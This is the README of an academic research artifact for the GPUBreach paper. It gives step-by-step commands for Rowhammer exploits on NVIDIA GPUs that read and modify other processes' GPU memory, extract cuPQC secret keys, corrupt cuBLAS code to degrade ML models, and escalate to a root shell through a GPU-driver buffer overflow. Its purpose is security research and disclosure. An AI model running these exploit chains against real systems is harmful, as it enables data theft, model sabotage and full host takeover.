# GPUBreach (IEEE Symposium on Security & Privacy, 2026)

## Introduction

This is the code artifact for the paper 
**"GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer"**, to be presented at [IEEE Security & Privacy (Oakland) 2026](https://sp2026.ieee-security.org/)

Authors: 
Chris S. Lin, Yuqin Yan, Joyce Qu, Joseph Zhu, Guozhen Ding, David Lie, Gururaj Saileshwar.
University of Toronto

## Results Reproduced by this Artifact

In this artifact, we aim to reproduce the following:
1. PT Massaging Primitives (Figures 5, 7, 8, and 10)

2. GPU Privilege Escalation - Arbitrary Read & Write Capabilities with GPUBreach (Table 2, Sections 6.1 - 6.3, Table 3)

3. CPU Privilege Escalation - End-to-End GPU-CPU Exploit (Section 6.4)

All the results are automatically generated **except** the *CPU Privilege Exploit*, which has an interactive component (more details below).

**Please see [`src/README.md`](https://github.com/sith-lab/gpubreach/blob/main/src/README.md) for additional usage/implementation details.**

## Required Environment
**Run-time Environment:**  We suggest using a Linux distribution compatible with g++-11 or newer.

- Software Dependencies:
   - CMake 3.22+
   - g++ with C++17 Support
   - NVIDIA CUDA Driver: 580.95.05
   - NVIDIA CUDA Toolkit
   - NVIDIA System Management Interface `nvidia-smi`
   - Python 3.10+

- Hardware Dependencies:
   - NVIDIA GPU sm_80+

### Reference Environment
Our reference system:

- OS: Ubuntu 22.04.5 LTS
- CPU: AMD Ryzen Threadripper PRO 5945WX 12-Cores
- GPU: NVIDIA RTX A6000 (48 GB GDDR6, sm_80)
- Driver: NVIDIA Driver 580.95.05 (includes nvidia-smi)
- CUDA Toolkit: 12.8
- Compiler: g++ 10.5.0

## Steps for Artifact Evaluation

<!-- **For Artifact Evaluation, jump directly to [Step 4 (Run Artifacts)](#4-run-artifacts), since we have already set up the environment (Steps 1 to 3).** -->

## 1. (Ignore if using Zenodo) Clone the Repository 

Ensure you have already cloned the repository:
```bash
git clone https://github.com/sith-lab/gpubreach.git
cd gpubreach
```

## 2. NVIDIA Driver Setup

Our profiling results require the set of tools developed in the [`gpu-tlb`](https://github.com/0x5ec1ab/gpu-tlb.git) repository. This is included in our artifact. Patching the NVIDIA driver with the modifications from `gpu-tlb` works as follows: (this step can be skipped for AE, as we have the patched driver set up on our local GPU)

```bash
cd gpubreach

wget https://us.download.nvidia.com/XFree86/Linux-x86_64/580.95.05/NVIDIA-Linux-x86_64-580.95.05.run

chmod +x NVIDIA-Linux-x86_64-580.95.05.run

./NVIDIA-Linux-x86_64-580.95.05.run -x

cd NVIDIA-Linux-x86_64-580.95.05/

# This patch works for our version as well.
patch -p1 < ../gpu-tlb/dumper/patch/driver-570.133.07.patch
```

Now use the installer to install the driver. Please select **MIT/GPL** installation and choose just the default options.

```bash
sudo ./nvidia-installer
```

Afterward, run these to make the relevant dumpers.

```bash
cd ../ # goes back to gpubreach
bash run_make_dumpers.sh
```

## 3. GPU Setup and Software Pre-Requisites

#### GPU Setup

For the Rowhammer attack, a prerequisite is having **ECC disabled**. We observe that this is the default setting on A6000 GPUs on many cloud providers. But if it is enabled, use the following commands to disable it (we have already set this up on our local GPU, so you can skip this step for AE):

```bash
# No need to do this for AE.
sudo nvidia-smi -e 0
rmmod nvidia_drm 
rmmod nvidia_modeset
sudo reboot
```

Our profiling is easier with the persistence mode enabled and with fixed GPU and memory clock rates, although these are not prerequisites. The following script performs the above actions:

```bash
# Example usage: 
#  bash ./src/gpuhammer/util/init_cuda.sh <MAX_GPU_CLOCK> <MAX_MEMORY_CLOCK>
cd gpubreach
bash ./src/gpuhammer/util/init_cuda.sh 1800 7600
```

**MAX_GPU_CLOCK** and **MAX_MEMORY_CLOCK** can be found with `deviceQuery` from CUDA samples. We provide this for A6000 in 'gpuhammer/src/deviceQuery.txt'. 

These changes can be undone with `bash ./src/gpuhammer/util/reset_cuda.sh`.

#### Download ImageNet Validation Dataset

Our artifact requires the ImageNet 2012 Validation Dataset, which is available from the official ImageNet website. Please note that downloading requires a (free) ImageNet account — please register at https://www.image-net.org/download-images.php before proceeding.

We require the "Validation images (all tasks)" under Images when inside the ImageNet 2012 DataSet webpage. Please obtain the download link and download it **to the repository root** as follows:

```bash
# Make sure you are downloading the file into the repository root directory
cd gpubreach
wget <download link>
```

The downloaded file's name should be `ILSVRC2012_img_val.tar`.

## 4. Run Artifacts

Run the following commands to set up environment variables, install dependencies, and build GPUBreach. 

**Important: You should either run `source ./init_env.sh` for every terminal or add the exports to `.bashrc`.**

```bash
cd gpubreach
source ./init_env.sh
```

Afterwards, run:
```bash
bash ./run_auto_artifacts.sh
```

`./run_auto_artifacts.sh` runs the parts of the artifact that can be done _non-interactively_. This includes the PT Region Massaging Experiments (Fig 5, 7, 8, 10) and the demonstration of GPU-side privilege escalation in Section 6.1 - 6.3. We use one of the bit flips already discovered in Table-2 (A1) for all these attacks for ease of reproducibility.

---

### 1. PT Massaging Primitives (Figures 5, 7, 8, 10)

For PT Massaging Primitives, `./run_auto_artifacts.sh` will run the following steps to generate the results:

```bash
bash run_fig5.sh #(~ 30 minutes) ; Page types used with different allocation sizes.
bash run_fig7.sh # (< 1 minutes) ; UVM eviction side-channel to identify when memory is full
bash run_fig8.sh #(< 1 minutes)  ; UVM eviction side-channel when PT region is allocated with the memory
bash run_fig10.sh #(< 1 minutes) ; UVM eviction side-channel using 4KB Pages
```

and the results will be stored in `results/`. 

> **NOTE:** We additionally provide sample outputs of all experiments in the folder `./results/sample`.

##### Figure 5

Reproduced with `bash run_fig5.sh`. It iteratively tries different allocation sizes and extracts the data page sizes used with `gpu-tlb` dumper. The result is reproduced successfully if the output PDF uses 4KB pages for allocations greater than 2MB, using `./results/sample/fig5.pdf` as a reference.

##### Figure 7

Reproduced with `bash run_fig7.sh`. The result is reproduced successfully if the output PDF shows timing spikes of ~0.2ms after ~24000 allocations, using `./results/sample/fig7.pdf` as a reference. The timing may look slightly different from our paper due to a more recent driver used for our artifact.

##### Figure 8

Reproduced with `bash run_fig8.sh`. The result is reproduced successfully if the output PDF shows a timing spike for leaving 2MB freed but none for leaving 4MB free, using `./results/sample/fig8.pdf` as reference.

##### Figure 10

Reproduced with `bash run_fig10.sh`. The result is reproduced successfully if the output PDF shows consistent timing spikes every 508 allocations, using `./results/sample/fig10.pdf` as a reference.

---

### 2. GPU Privilege Escalation (Sections 6.1-6.3)

`./run_auto_artifacts.sh` also runs the parts of the artifact to demonstrate the GPU-side privilege escalation (Exploits in Section 6.1-6.3). It runs the scripts shown below, reproducing the known vulnerable bit flips (Table-2) and using one of the bit flips (A1 in Table-2) for subsequent experiments. 

```bash
bash run_t2.sh # (< 10 minutes) ; It hammers the known vulnerable bitflip positions that we used in the paper, to reproduce Table 2.
bash run_gpubreach_demo.sh #(< 5 minutes) ; It runs the exploit and reads/modifies another process's data from the GPU memory.
## The privilege escalation takes ~17 seconds, the rest of the time is spent on memory dumping for the demonstration.
bash run_cupqc_exploit.sh  #(< 1 hour) ; It runs the exploit, then locates the memory used by victim cuPQC kernels and extracts the secret keys.
bash run_ml_exploit.sh #(< 10 minutes) ; It runs the exploit, then modifies a cuBLAS branch through the known vulnerable cuBLAS SASS template, which degrades the model accuracy universally.
```

> **Note 1:** Other than `run_t2.sh`, the other scripts spawn detached background processes, which need to be killed manually if you decide to terminate the exploit scripts early.

> **Note 2:** There is a very low probability of the exploit chains crashing the attacker program, in which case you can simply re-run the exploit bash script when everything is killed or if necessary, reboot or power cycle in [Debugging Tips](#debugging-tips).

#### Table 2 (Section 6.1)
With `bash run_t2.sh`, we ran GPUHammer to reproduce the bit-flips in Table 2. All of these are at appropriate locations suitable for our GPU page table tampering.

Table 2 is generated successfully if the results in `results/t2/t2.txt` overlap with Table 2 in the paper. Note that sometimes not all flips may be reproduced due to the temporal randomness of Rowhammer.

#### GPUBreach Demo (Section 6.1)
With `bash run_gpubreach_demo.sh`, the GPUBreach exploit chain runs automatically on our GPU and achieves GPU privilege escalation, gaining arbitrary read/write privilege on GPU memory. These privileges are demonstrated by showing that we can read and modify another program's data in the GPU memory. Once this is achieved, exploits in Sections 6.2 and 6.3 can be executed.  

In this demonstration, a victim program from `./data_scripts/gpubreach_demo/sample_app.cu` is run and its memory is initialized to **0xdeadbeefabcdabcd**.

GPU privilege escalation is successful if the results in `results/gpubreach_demo/memdump.txt` show that the memory dumped by GPUBreach contains  **0xdeadbeefabcdabcd**, and the `results/gpubreach_demo/app.out` shows "Modified. Exiting" which indicates this memory was also modified by GPUBreach.

#### cuPQC exploit (Section 6.2)

With `bash run_cupqc_exploit.sh`, after GPU privilege-escalation, the attacker attempts to locate memory used by the victim by exploiting the cudaFree/Alloc() memory-zeroing behaviour. Then, it will rapidly dump out the candidate victim pages found, looking for secret keys.

In this demonstration, a victim program from `./data_scripts/cupqc_exploit/keyexchange_victim.cu` is run repeatedly every 2 seconds. Each time, the attacker probes each candidate page and dumps the content.

The attack is successful if the results in `results/cupqc_exploit/cupqc.txt` show that one of the candidate pages was dumped successfully with the expected secret key value. 

#### ML Degradation exploit (Section 6.3)

With `bash run_ml_exploit.sh`, after GPU privilege-escalation, the attacker looks for a known vulnerable cuBLAS template in GPU memory and corrupts the vulnerable branch.

In this demonstration, a victim program from `./data_scripts/ml_exploit/run_imagenet_models.py` is run. Once the pytorch cuBLAS code is loaded into the GPU code segment, the attacker will corrupt the target branch during its idle time, resulting in universally degraded accuracy for all models.

The attack is successful if the results in `results/ml_exploit/t3.txt` show similar degradation and performance impact as Table 3 in the paper.

---

### 3. CPU Privilege Escalation (Section 6.4)

This exploit starts from the user space on the GPU and achieves an arbitrary write primitive to the CPU's kernel memory, assuming IOMMU protection is enabled. The attacker tampers with the GPU driver metadata in the CPU memory via DMA from the GPU (region permitted for access by the IOMMU). This tampered data, when consumed by the GPU driver, causes a buffer overflow that overwrites an adjacent buffer in the GPU driver containing kernel memory pointers. This results in an arbitrary write primitive inside the entire kernel memory: the attacker uses the arbitrary write primitive in the kernel space to overwrite the `euid` of the current process to 0, and thus spawns a root shell.

Our evaluation has the following CPU-side configuration:

```
Architecture:            x86_64
  CPU op-mode(s):        32-bit, 64-bit
  Address sizes:         48 bits physical, 48 bits virtual
  Byte Order:            Little Endian
CPU(s):                  24
  On-line CPU(s) list:   0-23
Vendor ID:               AuthenticAMD
  Model name:            AMD Ryzen Threadripper PRO 5945WX 12-Cores
    CPU family:          25
    Model:               8
    Thread(s) per core:  2
    Core(s) per socket:  12
    Socket(s):           1
    Stepping:            2
NUMA:
  NUMA node(s):          1
  NUMA node0 CPU(s):     0-23
```

#### Step 0: Preparations

**Dump the Cred Structure Address**

This step gets the address of the `cred` structure. This is based on the exploit's assumption that a process's `cred` data structure can be leaked via other side-channels.

```bash
$ cd gpubreach/cred_mod/
$ make
$ sudo insmod get_cred_addr.ko
```
**Build CPU-side exploit**

Next, we build the CPU-side exploit components. We also generate a file `d_pattern.bin` containing a 1GB data pattern of repeating "0x64", that will be filled in the GPU memory. This pattern is used to identify the PA for a VA we control, and the associated PTE, which we will eventually redirect to the IOVA region. 

```bash
$ cd gpubreach/d2h-tools/
$ ./create_d_pattern.py --size 1GB --output d_pattern.bin
$ cd cpu-exploit/
$ make -j
```
---

#### Step 1: Perform GPUBreach
This step will perform the GPU-side privilege escalation, find the candidate PTE of a VA we control to redirect the translation to point to an IOVA. 

**First, we execute the GPUBreach program designed for this exploit.**

```bash
$ cd gpubreach
$ python3 gpubreach.py app_cpu_exploit --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini"
```

> Note: '-c' is the bit-flip configuration file for A1. See `src/README.md` for more details.

When corruption is successful, the program will pause, and you will see the following text:
```text
(Stable Primitive Ready) Start cpu-exploit now. It should load its page with 0x6464646464646464.
Press Enter Key to start finding and modifying that page's PTE.
```

**Next, we locate the PTE that we need to tamper with to access the IOVA.**

**On a second terminal**, please execute the following, which first loads the attacker memory with `0x6464646464646464`:
```bash
$ cd gpubreach/d2h-tools
$ ./cpu-exploit/cpu-exploit ./d_pattern.bin
```

Once this creates a new terminal, it means the data has been loaded. Now go back to GPUBreach’s terminal (first terminal) and **Press Enter Key**. On success, GPUBreach will print the text below:
```text
Found its PTE, modified your pointer's PTE to point to: 0x060000000fff0005
Press Enter Key if you want to write 0x060000000ffe0005 instead.
```

Note that the GPU's IOVA value is stable across runs and machines, always 0xffe41000 or 0xfff41000. Unfortunately, we do not know which one is used on each bootup, so the attack may fail. Regardless, you may choose whether to write `0x060000000fff0005` or `0x060000000ffe0005` by following the instructions from the GPUBreach output.

Now you are ready to move on to Step 2.

---

#### Step 2: Execute CPU Privilege Escalation

In the command prompt that was opened using `./cpu-exploit` (second terminal above), run the following application commands step by step. Note that `>` means that these commands are run in the exploit's command prompt, not the regular shell.

```bash
> poc-init # Initializes the base of the buffer under operation by scanning the memory.
> poc-cw-entry0-checksum # Scans the slots, discovers the current sequence numbers, and infers the next couple of sequence numbers that will be used. It then generates a payload indicating that there are 16 more messages followed by it with the correct checksum and writes them to the next entries, which the POC predicts the GPU Driver will consume.
> poc-privesc  # Construct the 17-entry message that will overflow the buffer, and then overwrite the GSP's message queue in the driver.
> poc-trigger 1  # Start a thread that continuously sends GPU queries.
```
---

#### Step 3: Verify CPU privilege escalation

You can now return to the exploit's command prompt and check your privileges:

```bash
> whoami
```

**Expected output:**
```
User identity check:
  Real UID:      1000 (this is your original UID, which might differ from this)
  Effective UID: 0
```

The effective UID of 0 indicates successful privilege escalation to root.

If the Effective UID is not 0, the exploit has failed. You can try to execute `poc-trigger 5` again. **If still unsuccessful, you may need to reboot the machine using out-of-band methods and restart the exploit.**

---

#### Step 4: Spawn root shell

If the previous step has succeeded, use the `fork` command to spawn a root shell:

```bash
> fork
```

**Expected output:**
```
In child process (PID: XXXX)
Effective UID: 0
# whoami 
root
# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin)
```

You now have a root shell while starting as a regular user.

---

#### Alternative Step 1: Exploit with simulated bit flips

To reproduce only the driver-side vulnerability and CPU privilege escalation, we may attempt to perform the exploit by simulating the GPU-side privilege escalation without GPUBreach, but with the `gpu-tlb` dumper instead.

> This is because sometimes the bit flips can disappear for a while, especially sometimes after we power cycle the machine (i.e. [Debugging Tips](#debugging-tips)).

In one terminal, we execute:
```bash
$ cd gpubreach/d2h-tools
$ ./cpu-exploit/cpu-exploit ./d_pattern.bin  # Run this command as-is as a regular user with GPU access (non-root).
```

Instead of using GPUBreach, we will simulate the arbitrary RW with the `simulate_rowhammer.sh` script. Modify the `IOVA_BASE` in `simulate_rowhammer.sh` to `0xfff00000` or `0xffe00000`.

In another terminal, we execute:
```bash
$ cd d2h-tools/gpu_mem_dumper/scripts/
$ sudo bash ./simulate_rowhammer.sh
``` 

Now you can go back to step 2 above.

---

### Debugging Tips

1. After an out-of-band restart, due to voltage changes, we notice bit-flips will disappear for a while. Whenever a restart happens, run the following to check for a bit-flip:

   ```bash
   cd gpubreach

   source ./init_env.sh # Not needed if already run before
   bash run_regenerate_a1.sh
   ```

   It will iteratively hammer and check whether the bit-flip re-appeared. Unfortunately, when exactly it will reappear is a bit variable (sometimes it takes a few minutes). You may choose to wait a few hours before restarting the process. For the CPU-GPU exploit, you may also go to the [Alternative Step 1](#alternative-step-1-exploit-with-simulated-bit-flips), given that we already demonstrated arbitrary RW.
